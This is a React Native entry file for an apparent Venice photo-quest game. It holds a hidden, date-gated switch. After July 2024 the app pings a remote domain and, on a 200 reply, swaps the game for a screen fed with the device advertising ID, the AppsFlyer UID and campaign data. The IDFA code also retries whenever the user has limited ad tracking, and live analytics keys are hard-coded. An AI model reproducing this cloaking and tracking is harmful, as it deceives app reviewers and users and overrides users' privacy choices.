import {NavigationContainer} from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {
  GameLevelsScreen,
  GameSingleLevelScreen,
  MainScreen,
  RulesScreen,
  UserScreen,
} from './Screens';
import {QuestProvider} from './store/quest_context';
import {useEffect, useRef, useState} from 'react';
import {Animated, View, StyleSheet} from 'react-native';
import VeneziaPhotoQuestProdactScreen from './Screens/VeneziaPhotoQuestProdactScreen';
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import appsFlyer from 'react-native-appsflyer';
import {LogLevel, OneSignal} from 'react-native-onesignal';

const Stack = createNativeStackNavigator();

const App = () => {
  const [route, setRoute] = useState();
  const [idfa, setIdfa] = useState();
  //console.log('idfa==>', idfa);
  const [appsUid, setAppsUid] = useState(null);
  const [sab1, setSab1] = useState();
  const [pid, setPid] = useState();

  useEffect(() => {
    getData();
  }, []);

  useEffect(() => {
    setData();
  }, [idfa, appsUid, sab1, pid]);

  const setData = async () => {
    try {
      const data = {
        idfa,
        appsUid,
        sab1,
        pid,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      //console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      console.log('Помилка збереження даних:', e);
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        //console.log('Дані дістаються в AsyncStorage');
        //console.log('parsedData in App==>', parsedData);
        setIdfa(parsedData.idfa);
        setAppsUid(parsedData.appsUid);
        setSab1(parsedData.sab1);
        setPid(parsedData.pid);
      } else {
        await fetchIdfa();
        await requestOneSignallFoo();
        await performAppsFlyerOperations();
        await getUidApps();

        onInstallConversionDataCanceller();
      }
    } catch (e) {
      console.log('Помилка отримання даних:', e);
    }
  };

  //////////////////////AppsFlyer
  // 1ST FUNCTION - Ініціалізація AppsFlyer
  const performAppsFlyerOperations = async () => {
    try {
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'SaD7GwYCXEMiVeyH3UnWZ4',
            appId: '6504914708',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
          },
          resolve,
          reject,
        );
      });
      //console.log('App.js AppsFlyer ініціалізовано успішно');
    } catch (error) {
      //console.error('App.js Помилка під час виконання операцій AppsFlyer:', error,);
    }
  };

  // 2ND FUNCTION - Ottrimannya UID AppsFlyer
  const getUidApps = async () => {
    try {
      const appsFlyerUID = await new Promise((resolve, reject) => {
        appsFlyer.getAppsFlyerUID((err, uid) => {
          if (err) {
            reject(err);
          } else {
            resolve(uid);
          }
        });
      });
      //console.log('on getAppsFlyerUID: ' + appsFlyerUID);
      setAppsUid(appsFlyerUID);
    } catch (error) {
      //console.error(error);
    }
  };

  // 3RD FUNCTION - Отримання найменування AppsFlyer
  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    res => {
      try {
        const isFirstLaunch = JSON.parse(res.data.is_first_launch);
        if (isFirstLaunch === true) {
          if (res.data.af_status === 'Non-organic') {
            //const media_source = res.data.media_source;
            //console.log('App.js res.data==>', res.data);

            const {campaign, pid, af_adset, af_ad, af_os} = res.data;
            setSab1(campaign);
            setPid(pid);
          } else if (res.data.af_status === 'Organic') {
            console.log('This is first launch and a Organic Install');
            console.log('App.js res.data==>', res.data);
            const {af_status} = res.data;
            //alert('This is first launch and a Organic Install');
            setSab1(af_status);
          }
        } else {
          console.log('This is not first launch');
          //alert('This is not first launch');
        }
      } catch (error) {
        //console.error('Error processing install conversion data:', error);
      }
    },
  );

  //////////////////////OneSignal
  // fe918b51-f5cc-4505-af1e-449d7badc041
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true);
        resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
      } catch (error) {
        reject(error); // Викликаємо reject() у разі помилки
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      //console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal Initialization
  OneSignal.initialize('fe918b51-f5cc-4505-af1e-449d7badc041');

  OneSignal.Notifications.addEventListener('click', event => {
    //console.log('OneSignal: notification clicked:', event);
  });
  //Add Data Tags
  OneSignal.User.addTag('key', 'value');

  //////////////////////IDFA
  const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (!res.isAdTrackingLimited) {
        setIdfa(res.id);
      } else {
        //setIdfa(true);
        fetchIdfa();
      }
    } catch (err) {
      //console.log('err', err);
      setIdfa(null);
      fetchIdfa(); //???
    }
  };

  ////////////////////////Route useEff  https://incredible-cool-win.space/Bjtz9Sx1
  useEffect(() => {
    const checkUrl = `https://incredible-cool-win.space/Bjtz9Sx1`;

    const targetData = new Date('2024-07-07T10:00:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (currentData <= targetData) {
      setRoute(false);
    } else {
      fetch(checkUrl)
        .then(r => {
          if (r.status === 200) {
            //console.log('status==>', r.status);
            setRoute(true);
          } else {
            setRoute(false);
          }
        })
        .catch(e => {
          //console.log('errar', e);
          setRoute(false);
        });
    }
  }, []);
  ////////////////////////Route
  const Route = ({isFatch}) => {
    if (isFatch) {
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={{
              idfa: idfa,
              sab1: sab1,
              pid: pid,
              uid: appsUid,
            }}
            name="VeneziaPhotoQuestProdactScreen"
            component={VeneziaPhotoQuestProdactScreen}
            options={{headerShown: false}}
          />
        </Stack.Navigator>
      );
    }
    return (
      <Stack.Navigator>
        <Stack.Screen
          name="MainScreen"
          component={MainScreen}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="GameLevelsScreen"
          component={GameLevelsScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="GameSingleLevelScreen"
          component={GameSingleLevelScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="RulesScreen"
          component={RulesScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="UserScreen"
          component={UserScreen}
          options={{headerShown: false}}
        />
      </Stack.Navigator>
    );
  };
  ////////////////////////Louder
  const [louderIsEnded, setLouderIsEnded] = useState(false);

  const appearingAnim = useRef(new Animated.Value(0)).current;
  const appearingSecondAnim = useRef(new Animated.Value(0)).current;

  useEffect(() => {
    Animated.timing(appearingAnim, {
      toValue: 1,
      duration: 3000,
      useNativeDriver: true,
    }).start();
  }, []);

  useEffect(() => {
    setTimeout(() => {
      Animated.timing(appearingSecondAnim, {
        toValue: 1,
        duration: 3000,
        useNativeDriver: true,
      }).start();
      //setLouderIsEnded(true);
    }, 3000);
  }, []);

  useEffect(() => {
    setTimeout(() => {
      setLouderIsEnded(true);
    }, 7000);
  }, []);

  return (
    <QuestProvider>
      <NavigationContainer>
        {!louderIsEnded ? (
          <View
            style={{
              position: 'relative',
              flex: 1,
              backgroundColor: 'rgba(0,0,0)',
            }}>
            <Animated.Image
              source={require('./assets/img/loader1.jpg')} // Special animatable View
              style={{
                //...props.style,
                opacity: appearingAnim,
                width: '100%',
                height: '100%',
                position: 'absolute', // Bind opacity to animated value
              }}
            />
            <Animated.Image
              source={require('./assets/img/loader2.jpg')} // Special animatable View
              style={{
                //...props.style,
                opacity: appearingSecondAnim,
                width: '100%',
                height: '100%',
                position: 'absolute', // Bind opacity to animated value
              }}
            />
          </View>
        ) : (
          <Route isFatch={route} />
        )}
      </NavigationContainer>
    </QuestProvider>
  );
};

export default App;

const styles = StyleSheet.create({
  image: {width: '100%', height: 300, flex: 1},
  imageContainer: {
    flex: 1,
  },
});

{
  /**
  import React from 'react';
import {
  Text,
  View,
} from 'react-native';

const App = () => {
  return (
    <View style={{flex:1, alignItems:'center',justifyContent:'center', backgroundColor:'#fff'}}>
      <Text>Hello World!</Text>
    </View>
  )
}

export default App;
  */
}
